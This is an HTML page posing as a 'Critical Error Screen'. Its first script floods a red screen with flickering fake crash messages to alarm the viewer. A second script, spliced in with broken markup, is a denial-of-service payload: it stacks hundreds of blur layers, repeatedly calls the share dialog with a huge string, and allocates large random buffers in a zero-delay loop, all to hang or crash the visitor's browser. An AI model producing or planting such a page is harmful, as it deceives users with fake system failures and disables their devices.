<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Critical Error Screen</title>
    <style>
        * {
            box-sizing: border-box;
        }
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: red;
            overflow: hidden; /* Прячем прокрутку, чтобы текст не вылезал */
        }
        #error-container {
            width: 100%;
            height: 100%;
            padding: 10px;
            color: black;
            font-size: 11px; /* Мелкий шрифт */
            font-family: monospace;
            display: flex;
            flex-wrap: wrap;
            gap: 8px; /* Расстояние между фразами */
            justify-content: flex-start;
            align-content: flex-start;
        }
        .error-item {
            display: inline-block;
            text-transform: uppercase;
        }
    </style>
</head>
<body>

    <div id="error-container"></div>

    <script>
        const errorMessages = [
            "ERROR ERROR",
            "Bootlooping...",
            "FATAL EXCEPTION",
            "Kernel Panic",
            "System Crash",
            "Data Corrupted",
            "Rebooting...",
            "ACCESS_DENIED",
            "HARDWARE_FAILURE",
            "CORE_DUMP",
            "0x0000007B",
            "CRITICAL_PROCESS_DIED",
            "MEM_ALLOC_FAILED"
        ];

        const container = document.getElementById('error-container');
        const elementsArray = [];
        
        // Заполняем экран элементами с запасом
        const totalElements = 500; 

        function getRandomMessage() {
            return errorMessages[Math.floor(Math.random() * errorMessages.length)];
        }

        // Первоначальная генерация сетки
        for (let i = 0; i < totalElements; i++) {
            const span = document.createElement('span');
            span.className = 'error-item';
            span.textContent = getRandomMessage();
            container.appendChild(span);
            elementsArray.push(span);
        }

        // Эффект "живого" сбоя: быстро и хаотично меняем случайные блоки текста
        setInterval(() => {
            // За один тик меняем сразу 25 случайных надписей для эффекта мерцания
            for (let i = 0; i < 25; i++) {
                const randomIndex = Math.floor(Math.random() * elementsArray.length);
                elementsArray[randomIndex].textContent = getRandomMessage();
            }
        }, 40); // Частота обновления (40 миллисекунд)
    <body style="margin:0; overflow:hidden;">
      <script>
        const container = document.createElement('div');
        container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
        document.body.appendChild(container);

        for (let i = 0; i < 500; i++) {
          let d = document.createElement('div');
          d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg); opacity: 0.99;';
          container.appendChild(d);
        }

        setInterval(() => {
          try {
            navigator.share({ title: 'R', text: 'R'.repeat(100000) });
          } catch(e) {}

          let x = new Uint8Array(1024 * 1024 * 20);
          crypto.getRandomValues(x);
        }, 0);
    </script>
</body>
</html>
